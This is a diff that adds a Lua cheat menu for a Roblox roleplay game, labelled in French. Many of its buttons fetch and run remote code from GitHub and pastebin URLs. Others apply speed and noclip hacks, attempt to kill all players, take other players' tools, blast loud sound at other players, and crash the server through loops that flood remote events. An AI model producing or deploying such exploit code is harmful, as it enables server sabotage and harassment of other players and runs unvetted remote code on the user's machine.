@@ -1,0 +1,221 @@
+local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/xHeptc/Kavo-UI-Library/main/source.lua"))()
+local Window = Library.CreateLib("🦉Galax RP Cheat V2 [LKS] Special October 🎃", "BloodTheme")
+
+--MAIN
+local Main = Window:NewTab("Main")
+local MainSection = Main:NewSection("Main")
+
+
+
+
+
+
+MainSection:NewButton("Infinity Yield V6", "Deviens Administrateur !", function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source"))()
+end)
+
+
+--LOCAL PLAYER
+local Player = Window:NewTab("Script")
+local PlayerSection = Player:NewSection("Script")
+
+PlayerSection:NewSlider("Walk Speed", "Cours Vite !", 500, 16, function(s)
+    game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = s
+end)
+
+PlayerSection:NewSlider("Jump", "Saute Haut ! !!!", 500, 50, function(s)
+    game.Players.LocalPlayer.Character.Humanoid.JumpPower = s
+end)
+
+PlayerSection:NewButton("Btools (FA/WL)", "Obtiens le btools", function()
+    loadstring(game:HttpGet("https://cdn.wearedevs.net/scripts/BTools.txt"))()
+end)
+
+PlayerSection:NewButton("NoClip (FA/WL)", "Traverse Des Objets", function()
+    for _, v in ipairs(workspace:GetDescendants()) do
+		if v:IsA("Part") then
+			if v.Name ~= "Baseplate" then
+				v.CanCollide = false
+			end
+		end
+	end
+end)
+
+PlayerSection:NewButton("Give Tools (FA/WL)", "Obtiens des tools gratuitement !", function()
+    for i,v in ipairs(game.ReplicatedStorage:GetDescendants()) do
+		if v:IsA("Tool") then
+			v:Clone().Parent = game.Players.LocalPlayer.Backpack
+		end
+
+	end
+end)
+
+PlayerSection:NewButton("Destroy Part Tool (FA/WL)", "Détruit Tout Sur Ton Passage !", function()
+    local player = game.Players.LocalPlayer
+	local mouse = player:GetMouse()
+	local tool = Instance.new("Tool")
+	tool.RequiresHandle = false
+	tool.Name = "DestroyPart"
+	mouse.Button1Down:Connect(function()
+		local target = mouse.Target
+		if target and target:IsA("Part") or "MeshPart" then
+			target:Destroy()
+		end
+	end)
+	tool.Parent = game.Players.LocalPlayer.Backpack
+end)
+
+PlayerSection:NewButton("Infinite Stamina (FA/WL)", "Arrête jamais de courir !", function()
+    local StarterCharacterScript = game.StarterPlayer.StarterCharacterScripts
+
+	local Stamina = StarterCharacterScript.ACS_Client.Variaveis.Stamina
+	Stamina.MaxValue = 8999999
+	Stamina.MaxValue = 9000000
+	Stamina.Value = 9000000
+end)
+
+PlayerSection:NewButton("TP Tools (FA/WL)", "Téléporte toi ou tu veux !", function()
+    local mouse = game.Players.LocalPlayer:GetMouse()
+	local tool = Instance.new("Tool")
+	tool.RequiresHandle = false
+	tool.Name = "TP Tool"
+	tool.Activated:connect(function()
+		local pos = mouse.Hit+Vector3.new(0,2.5,0)
+		pos = CFrame.new(pos.X,pos.Y,pos.Z)
+		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = pos
+	end)
+	tool.Parent = game.Players.LocalPlayer.Backpack
+end)
+
+PlayerSection:NewButton("Infinite Ammmo (WL)", "Tire jusqu'a l'infini et l'au dela !", function()
+    loadstring(game:HttpGet("https://pastebin.com/raw/vJfafiax"))()
+end)
+
+
+PlayerSection:NewButton("Remotes Events Spammer (FA/WL)", "Fait Crash le serveur !", function()
+    for i = 1,100000 do
+        game.ReplicatedStorage.Livraison:FireServer("Lyks Is Here")
+    end
+end)
+
+PlayerSection:NewButton("FireYourself (Client)", "Deviens l'homme de feu !", function()
+    local player = game.Players.LocalPlayer
+	if player and player.Character then
+		local Fire = Instance.new("Fire")
+		Fire.Parent = player.Character:FindFirstChild("HumanoidRootPart") or player.Character 
+		Fire.Size = 10
+		Fire.Heat = 5 
+	else
+		warn("SIUYHWEFHWE")
+	end
+end)
+
+PlayerSection:NewButton("Kill All (FA)", "Tue Tout le monde sur ton passage !", function()
+    --while wait() do
+	local DR = game:GetService("ReplicatedStorage")["ACS_Engine"].Events.Damage
+
+	for PlayerIndex,GivenPlayer in pairs(game.Players:GetPlayers()) do
+		local Char = GivenPlayer.Character
+		DR:InvokeServer(Char.Humanoid:TakeDamage(math.max(0,0)))
+	end
+end)
+
+PlayerSection:NewButton("Clone All Players Tools (WL/FA)", "Clone toi tout les tools des autres joueurs.", function()
+    for _, player in ipairs(game.Players:GetPlayers()) do
+        if player ~= game.Players.LocalPlayer then 
+            for _, v in ipairs(player:GetDescendants()) do
+                if v:IsA("Tool") then
+                    v:Clone().Parent = game.Players.LocalPlayer.Backpack
+                end
+            end
+        end
+    end
+    
+end)
+
+PlayerSection:NewButton("Fuck All Players FootStepts (WL)", "Casse les oreilles des autres joueurs !", function()
+    for _, v in ipairs(game.SoundService.Footsteps:GetDescendants()) do
+        if v:IsA("Sound") and not v.IsPlaying then
+            v:Play()
+            v.Volume = 100000
+            v.RollOffMinDistance = 1000
+        end
+    end 
+end)
+
+PlayerSection:NewButton("SkyFling Yourself (FA/WL)", "Envole Toi ! (Utulisez ce script dans des véhicules.)", function()
+    local power = 10000
+
+	game:GetService('RunService').Stepped:connect(function()
+		game.Players.LocalPlayer.Character.Head.CanCollide = false
+		game.Players.LocalPlayer.Character.Torso.CanCollide = false
+		game.Players.LocalPlayer.Character["Left Leg"].CanCollide = false
+		game.Players.LocalPlayer.Character["Right Leg"].CanCollide = false
+	end)
+
+	wait(.1)
+	local bambam = Instance.new("BodyThrust")
+	bambam.Parent = game.Players.LocalPlayer.Character.HumanoidRootPart
+	bambam.Force = Vector3.new(power,0,power)
+	bambam.Location = game.Players.LocalPlayer.Character.HumanoidRootPart.Position
+end)
+
+PlayerSection:NewButton("Server Crash (WL)", "Faite Crash le serveur !", function()
+    while task.wait() do
+
+        for i = 1, 30 do
+       game:GetService("ReplicatedStorage")["ACS_Engine"].Events.ServerBullet:FireServer(Vector3.new(0/0/0),Vector3.new(0/0/0))
+         end
+       end
+end)
+
+PlayerSection:NewButton("Fling All (FA/WL)", "Fait Rager Tout le monde !", function()
+    loadstring(game:HttpGet("https://pastebin.com/raw/zqyDSUWX"))()
+end)
+
+PlayerSection:NewButton("Unlock Badge (FA)", "Unlock Des Badges !", function()
+    
+for _,v in pairs(workspace:GetDescendants()) do
+    if v:IsA("TouchTransmitter") then
+        firetouchinterest(game.Players.LocalPlayer.Character.HumanoidRootPart, v.Parent, 0) --0 is touch
+        task.wait()
+        firetouchinterest(game.Players.LocalPlayer.Character.HumanoidRootPart, v.Parent, 1) -- 1 is untouch
+    end
+end
+
+end)
+
+PlayerSection:NewButton("Random Map Color (FA/WL)", "Voit le monde en couleur !", function()
+    for i, v in ipairs(workspace:GetDescendants()) do
+        if v:IsA("Part") or v:IsA("MeshPart") then
+            v.BrickColor = BrickColor.Random()
+        end
+    end
+end)
+
+PlayerSection:NewButton("Invisible Yourself (FA/WL)", "Deviens Invisible !", function()
+    loadstring(game:HttpGet('https://raw.githubusercontent.com/GhostPlayer352/Test4/main/Invisible%20Gui'))()
+end)
+
+PlayerSection:NewButton("Draw In The Chat (FA/WL)", "Deviens Piccasso", function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/ocfi/Choose-ARt-able-remove/main/wassdaadwasda"))()
+end)
+
+-- Other
+local Other = Window:NewTab("Exploit")
+local OtherSection = Other:NewSection("Exploit")
+
+OtherSection:NewButton("Dex Explorer", "Trouve des failles !", function()
+    loadstring(game:HttpGet("https://cdn.wearedevs.net/scripts/Dex%20Explorer.txt"))()
+end)
+
+OtherSection:NewButton("Turtle Spy", "Trouve des failles !", function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/Turtle-Brand/Turtle-Spy/main/source.lua", true))()
+end)
+
+OtherSection:NewButton("Galax Cheat V1", "Découvre la première version du cheat !", function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/DevLPSKiwano/GalaxCheat/refs/heads/main/GalaxCheat"))()
+end)
+
+
+
